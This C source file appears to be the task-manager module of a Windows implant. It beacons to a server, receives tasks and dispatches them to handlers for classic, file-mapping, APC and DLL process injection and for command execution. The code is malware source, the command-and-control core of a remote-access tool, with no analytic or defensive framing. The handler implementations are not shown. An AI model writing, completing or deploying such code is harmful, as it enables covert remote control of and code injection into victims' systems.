#include <Windows.h>
#include <stdio.h>
#include "TaskManager.h"
#include "Task.h"
#include "../Definitions.h"
#include "../memoryCollector/MemoryCollector.h"

TaskHandler handles[] = 
{
    injectViaClassicProcessTask,
    injectViaFileMappingTask,
    injectViaApcTask,
    injectViaDllTask,
    executeCommandTask,
};

void _processMessage(PTASK_MANAGER pTaskManager);

PTASK_MANAGER initTaskManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_QUEUE queueMessagesToSend)
{
    PTASK_MANAGER taskManager = (PTASK_MANAGER)allocMemory(sizeof(TASK_MANAGER));
    taskManager->queueMessageReceived = queueMessageReceived;
    taskManager->queueMessagesToSend = queueMessagesToSend;
    taskManager->running = TRUE;
    taskManager->sleepTime = 2000;
    return taskManager;
};

BOOL destroyTaskManager(PTASK_MANAGER pTaskManager)
{
    freeMemory(pTaskManager);
    return TRUE;
};


void processMessageThread(PPROCESS_MESSAGE_ARGS args)
{
    _processMessage(args->pTaskManager);
};

void _processMessage(PTASK_MANAGER pTaskManager)
{
    while(pTaskManager->running)
    {
        PMESSAGE messageReceive = pop(pTaskManager->queueMessageReceived);
        if(messageReceive == NULL)
        {
            PMESSAGE messageToSend = pingServer(); // Prepare PING message to server
            push(pTaskManager->queueMessagesToSend, messageToSend); // Push PING message to message to send queue
            Sleep(pTaskManager->sleepTime); // SLEEP while message is sended
        }
        else
        {
            PMESSAGE messageToSend = performTask(messageReceive);
            if(messageToSend == NULL)
            {
                break;
            }
            push(pTaskManager->queueMessagesToSend, messageToSend);
        }
    }
};

PMESSAGE performTask(PMESSAGE message)
{
    DWORD type = (DWORD)message->type;
    if(type >= TASK_ARRAY_UPPER_BOUNDARY)
    {
        return NULL;
    }

    PBYTE payload = message->payload;
    TaskHandler handler = handles[type];
    PMESSAGE messageToSend = handler(payload, message->size);
    freeMessage(message);
    return messageToSend;
};

